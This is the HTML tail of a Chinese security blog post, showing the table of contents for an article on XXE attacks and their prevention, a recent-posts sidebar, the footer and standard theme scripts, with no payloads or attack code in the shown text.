href="#%E2%91%A2-%E9%80%9A%E8%BF%87XInclude-%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB"><span class="toc-text">③ 通过XInclude 进行XXE攻击</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%91%A3-%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84-XXE-%E6%94%BB%E5%87%BB"><span class="toc-text">④ 通过文件上传的 XXE 攻击</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%91%A4-%E6%97%A0%E5%9B%9E%E6%98%BE-XXE-%E9%80%9A%E8%BF%87%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF%E6%A3%80%E7%B4%A2%E6%95%B0%E6%8D%AE"><span class="toc-text">⑤ 无回显 XXE 通过错误消息检索数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-XXE-%E6%94%BB%E5%87%BB%E9%A2%84%E9%98%B2"><span class="toc-text">0x04 XXE 攻击预防</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/10/06/DNS-Rebinding/" title="DNS Rebinding">DNS Rebinding</a><time datetime="2021-10-06T07:21:46.000Z" title="发表于 2021-10-06 15:21:46">2021-10-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/09/30/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="浅入理解重入漏洞（Re-Entrance）">浅入理解重入漏洞（Re-Entrance）</a><time datetime="2021-09-30T07:34:10.000Z" title="发表于 2021-09-30 15:34:10">2021-09-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/09/22/%E5%88%9D%E8%AF%86Solididy/" title="初识Solididy合约结构">初识Solididy合约结构</a><time datetime="2021-09-22T01:24:02.000Z" title="发表于 2021-09-22 09:24:02">2021-09-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/09/16/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8RPC/" title="远程过程调用RPC">远程过程调用RPC</a><time datetime="2021-09-16T14:34:44.000Z" title="发表于 2021-09-16 22:34:44">2021-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2020/09/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞">命令执行漏洞</a><time datetime="2020-09-19T05:04:31.000Z" title="发表于 2020-09-19 13:04:31">2020-09-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 By Banana69</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
